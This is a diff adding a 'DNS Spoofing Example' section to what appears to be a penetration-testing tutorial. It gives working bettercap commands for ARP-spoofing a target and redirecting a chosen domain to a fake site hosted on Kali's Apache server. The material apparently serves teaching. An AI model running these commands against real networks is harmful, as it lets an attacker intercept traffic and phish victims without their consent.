@@ -600,4 +600,35 @@ The same can be performed using our automated script as well which is at the spe
 
 - This will work against all websites even if they use https, as we saw earlier, the other website uses https, and it loaded over https by default. The only websites this will not work against are ones that use HSTS, because as I mentioned before, the browser has list of these websites, the list is stored locally, so it doesn't send any request. And, will only load these websites over https.
 
+#### DNS Spoofing Example
+
 Let's look at an example output of DNS Spoofing using bettercap:
+
+- Create your fake website, and replace the content of `/var/www/html/index.html` with your fake content, and run the command:
+
+  ```bash
+  service apache2 start
+  ```
+
+- This will start the Apache web server on Kali.
+
+  ![](../imgs/dns-spoof1.png)
+
+- Once, the web server is started, start bettercap using the command:
+
+  ```bash
+  bettercap -iface <interface_name>
+  ```
+
+  Use the following commands in bettercap terminal:
+
+  ```bash
+  net.probe on; net.sniff on; arp.spoof.fullduplex true; arp.spoof.targets <target_ip>; arp.spoof on; set dns.spoof.domains www.targetsite.com,*.targetsite.com; dns.spoof on;
+  ```
+
+  ![](../imgs/dns-spoof2.png)
+
+- Now, go to the target machine and try to access the target website (e.g., `www.targetsite.com`). You will see that the website is redirected to the attacker's web server.
+
+  ![](../imgs/dns-spoof3.png)
+  ![](../imgs/dns-spoof4.png)
